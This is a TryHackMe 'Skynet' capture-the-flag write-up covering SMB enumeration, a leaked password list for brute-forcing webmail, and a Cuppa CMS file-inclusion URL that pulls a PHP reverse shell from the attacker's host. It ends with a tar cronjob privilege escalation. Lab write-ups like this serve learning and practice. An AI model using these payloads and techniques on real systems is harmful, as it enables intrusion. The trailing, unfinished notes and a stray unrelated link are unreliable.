---
layout: default
title: Skynet
parent: TryHackMe
nav_order: 3
---

## [](#header-2)Summary:

1. Find/Enumarate Samba  
2. Bruteforce mail server login 
3. Find hidden web dir 
4. Use Cuppa exploit to drop remote shell for intitial access
5. Privesc using cronjob

## [](#header-2)Recon:


Intial nmap scan shows an Apache server running on port 80, email clients (pop3/imap),and some "potentially" vulnerable samaba shares.
![](pictures/nmap0-skynet.PNG)


Navigating to the apache server on port 80 we see a skynet search engine which doesn't give us much in terms of functionality.

![](pictures/website-skynet.PNG)

After running smbmap on the host we can see there are 4 seperate shares.

![](pictures/smbmap-skynet.PNG)

Running gobuster reveals two interesting finds an admin direcory and a mail server called "squirrelmail".

![](pictures/gobuster0-skynet.PNG)

## [](#header-2)Enumeration:


From here the only smbshare we are able to access at this point is "anonymous" which has "READ ONLY" permissions.
```bash
smbclient //<targetip>/anonymous 
```
Once we are in the anonymous share we can see two files/folders of interest.
![](pictures/sambadir-skynet.PNG)

From here we want to retrieve these files to further analyze with the following command.

```bash
smbget -R smb://<target ip>/anonymous
```

![](pictures/sambaget-skynet.PNG)


Reading the attention txt file we find out that passwords for users accross the system have been changed, some may call this a "clue".
```bash
kali@kali:~/Desktop/tryhackme/skynet$ cat attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```



We then find that log1.txt contains what seems to be passwords that mightve been apart of the recent change.
kali@kali:~/Desktop/tryhackme/skynet$ cat log1.txt 
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
'''




webmail:
https://www.dailydot.com/debug/facebook-ai-invent-language/


searchsploit cuppa
cuppa:
http://10.10.58.237/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.22.131:8000/php-reverse-shell.php



root:

Was able top get the root flag by abusing the tar function into getting the cronjob to spit out the root flag into the /tmp directory

Whenever the backups.sh cronjob runs the /var/www/html folder it then backed up and t
link tar sudo 